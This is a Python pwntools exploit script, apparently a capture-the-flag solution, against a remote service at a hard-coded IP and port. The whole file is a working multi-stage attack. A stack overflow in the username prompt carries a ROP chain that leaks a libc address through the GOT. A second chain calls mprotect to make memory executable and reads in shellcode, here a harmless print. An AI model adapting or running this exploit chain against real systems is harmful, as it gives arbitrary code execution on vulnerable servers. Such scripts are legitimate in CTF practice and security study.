#!/usr/bin/env python3
from pwn import *

PERCENT_S_NEWLINE = 0x4019c8
POP_RSI_RET = 0x4017fa
POP_RDI_RET = 0x4019a3
PRINTF_CHK_GOT = 0x603090
RET = 0x401545
USERNAME_READER = 0x4014c0
PRINTF_CHK_LIBC = 0x131040
MPROTECT_LIBC = 0x11bb00
WORK_PAGE = 0x603000
WORK_ADDR = 0x603150
WORK_SIZE = 0xeb0
PAGE_SIZE = 0x1000
POP_RSP_RET = 0x401063
MOV_RDI_R12_CALL_RBP = 0x40183c
POP_RBP_RET = 0x400f08
READ_LIBC = 0x111130


context.arch = 'amd64'
STAGE3 = asm(r'''
mov rax, 1
mov rdi, 1
lea rsi, [.str + rip]
mov rdx, .str_end - .str
syscall
.str:
    .asciz "hello from asm\n"
.str_end:
''')


def connect():
    if args.LOCAL:
        return process(['./server.py'])
    else:
        return remote('69.90.132.134', 3317)


def scanf_ok(x):
    # https://reverseengineering.stackexchange.com/a/10596
    return b'\x09' not in x and \
           b'\x0a' not in x and \
           b'\x0b' not in x and \
           b'\x0c' not in x and \
           b'\x0d' not in x and \
           b'\x20' not in x


def send_stage1(tube):
    tube.recvuntil(b'Username: ')
    payload = flat({
        0: b'admin\0',
        0x38: b''.join((
            struct.pack('<QQ', POP_RDI_RET, 1),
            struct.pack('<QQ', POP_RSI_RET, PERCENT_S_NEWLINE),
            # pop rdx; mov eax, 1; pop rbx; pop rbp; retn
            struct.pack('<QQQQ', 0x400e8f, PRINTF_CHK_GOT, 0, 0),
            # call ___printf_chk; pop rdx; mov eax, 1; pop rbx; pop rbp; retn
            struct.pack('<QQQQ', 0x400e8a, 0, 0, 0),
            # it just so happens that r12 == IPC *, so we can restart
            struct.pack('<QQ', POP_RBP_RET, USERNAME_READER),
            struct.pack('<Q', MOV_RDI_R12_CALL_RBP),
        )),
    })
    assert scanf_ok(payload), payload.hex()
    # input('stage1')
    tube.sendline(payload)
    printf_chk, = struct.unpack('<Q', tube.recvn(6).ljust(8, b'\x00'))
    libc = printf_chk - PRINTF_CHK_LIBC
    print(f'libc: 0x{libc:x}')
    assert libc & 0xfff == 0
    return libc


def send_stage2(tube, libc):
    tube.recvuntil(b'Username: ')
    payload = flat({
        0: b'admin\0',
        0x38: b''.join((
            struct.pack('<QQ', POP_RDI_RET, WORK_PAGE),
            struct.pack('<QQ', POP_RSI_RET, PAGE_SIZE),
            # pop rdx; mov eax, 1; pop rbx; pop rbp; retn
            struct.pack('<QQQQ', 0x400e8f, 0x7, 0, 0),
            struct.pack('<Q', libc + MPROTECT_LIBC),
            struct.pack('<QQ', POP_RDI_RET, 0),
            struct.pack('<QQ', POP_RSI_RET, WORK_ADDR),
            # pop rdx; mov eax, 1; pop rbx; pop rbp; retn
            struct.pack('<QQQQ', 0x400e8f, WORK_SIZE, 0, 0),
            struct.pack('<Q', RET),
            struct.pack('<Q', libc + READ_LIBC),
            struct.pack('<Q', RET),
            struct.pack('<Q', WORK_ADDR),
        ))
    })
    assert scanf_ok(payload)
    # input('stage2')
    tube.sendline(payload)


def pwn_once(tube):
    libc = send_stage1(tube)
    send_stage2(tube, libc)
    # input('stage3')
    tube.send(STAGE3)


def main():
    with connect() as tube:
        pwn_once(tube)
        tube.interactive()


if __name__ == '__main__':
    main()
